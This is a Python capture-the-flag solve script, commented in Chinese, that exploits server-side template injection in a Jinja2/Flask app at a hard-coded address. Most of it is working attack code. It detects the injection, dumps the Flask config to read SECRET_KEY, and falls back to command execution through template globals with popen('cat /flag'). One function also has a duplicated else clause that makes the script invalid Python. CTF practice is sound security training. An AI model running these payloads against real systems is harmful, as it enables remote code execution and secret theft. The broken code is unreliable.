#!/usr/bin/env python3
"""
CTF 解题脚本 — SSTI 模板注入 (Jinja2/Flask)
============================================
题目: Simple SSTI
目标: http://160.202.254.160:12115/?flag=
考点: 服务端模板注入 (SSTI) — Jinja2 config 对象泄露

解题流程:
  1. 探测首页 → 提示参数名 flag，Flask 框架
  2. SSTI 检测 → {{7*7}} 返回 49，确认模板注入
  3. 引擎识别 → {{7*'7'}} 返回 7777777，确认为 Jinja2
  4. 读取 config → {{config}} 输出 Flask 配置，SECRET_KEY 即 flag

依赖: requests
用法: python3 solve.py
"""
import requests
from urllib.parse import quote

BASE = "http://160.202.254.160:12115/"
PARAM = "flag"


def send_payload(payload, verbose=True):
    """发送 SSTI 载荷并返回响应文本"""
    # 花括号等特殊字符需要 URL 编码
    url = f"{BASE}?{PARAM}={quote(payload)}"
    if verbose:
        print(f"[*] Payload: {payload}")
    r = requests.get(url, timeout=10)
    return r.text


def step1_probe():
    """步骤1: 探测首页"""
    print("=" * 60)
    print("步骤1: 探测首页")
    print("=" * 60)
    r = requests.get(BASE, timeout=10)
    print(r.text.strip())
    # 检查是否有 HTML 注释提示
    if "<!--" in r.text:
        import re
        comments = re.findall(r'<!--(.+?)-->', r.text, re.DOTALL)
        for c in comments:
            print(f"\n[!] HTML 注释提示: {c.strip()}")
    print()


def step2_detect_ssti():
    """步骤2: SSTI 检测"""
    print("=" * 60)
    print("步骤2: SSTI 检测")
    print("=" * 60)

    # 基础检测: {{7*7}} → 49
    resp = send_payload("{{7*7}}")
    if "49" in resp:
        print(f"[+] {{7*7}} → 49  ✓ 确认存在 SSTI")
    else:
        print(f"[-] {{7*7}} → {resp!r}  未检测到 SSTI")
        return False

    # 引擎识别: {{7*'7'}} → Jinja2=7777777, Twig=49
    resp = send_payload("{{7*'7'}}")
    if "7777777" in resp:
        print(f"[+] {{7*'7'}} → 7777777  ✓ 确认为 Jinja2 (Flask)")
    else:
        print(f"[*] {{7*'7'}} → {resp!r}  非 Jinja2，需进一步识别")
    print()
    return True


def step3_exploit_config():
    """步骤3: 读取 Flask config 获取 flag"""
    print("=" * 60)
    print("步骤3: 读取 config 对象")
    print("=" * 60)

    resp = send_payload("{{config}}")

    # 从 config 输出中提取 SECRET_KEY
    import re
    # config 输出中 SECRET_KEY 的值为 HTML 实体编码
    # &#39; = 单引号
    decoded = resp.replace("&#39;", "'").replace("&lt;", "<").replace("&gt;", ">")
    match = re.search(r"SECRET_KEY['\"]?\s*[:=]\s*['\"]([^'\"]+)", decoded)
    if match:
        secret = match.group(1).strip()
        print(f"[+] SECRET_KEY = {secret}")
        return secret
    else:
        # 尝试直接匹配 flag{...}
        match = re.search(r"flag\{[^}]+\}", decoded)
        if match:
            print(f"[+] Flag found in config: {match.group()}")
            return match.group()
    else:
        print(f"[*] config 原始输出 (前500字符):")
        print(decoded[:500])
        return None


def step3_alt_exploit_subclasses():
    """备用方案: 通过 __subclasses__ 链读取文件 (当 config 不可用时)"""
    print("=" * 60)
    print("备用方案: __subclasses__ 链读取文件")
    print("=" * 60)

    # 方法: 通过 cycler 全局函数获取 os 模块
    payload = "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}"
    resp = send_payload(payload)
    if resp and "flag{" in resp:
        import re
        match = re.search(r"flag\{[^}]+\}", resp)
        if match:
            print(f"[+] 通过 popen 获取: {match.group()}")
            return match.group()

    # 方法: 通过 lipsum 全局函数
    payload = "{{lipsum.__globals__.os.popen('cat /flag').read()}}"
    resp = send_payload(payload)
    if resp and "flag{" in resp:
        import re
        match = re.search(r"flag\{[^}]+\}", resp)
        if match:
            print(f"[+] 通过 lipsum 获取: {match.group()}")
            return match.group()

    print("[-] 备用方案未成功")
    return None


def main():
    print("SSTI 解题脚本 — Simple SSTI (Jinja2/Flask)")
    print(f"目标: {BASE}")
    print()

    # 步骤1: 探测
    step1_probe()

    # 步骤2: 检测
    if not step2_detect_ssti():
        print("[-] 未检测到 SSTI，退出")
        return

    # 步骤3: 利用 — 读 config
    flag = step3_exploit_config()

    if not flag or "flag{" not in flag:
        # 备用: 命令执行读文件
        flag = step3_alt_exploit_subclasses()

    print()
    print("=" * 60)
    if flag and "flag{" in flag:
        print(f"Flag: {flag}")
    else:
        print(f"获取到的值: {flag}")
    print("=" * 60)


if __name__ == "__main__":
    main()
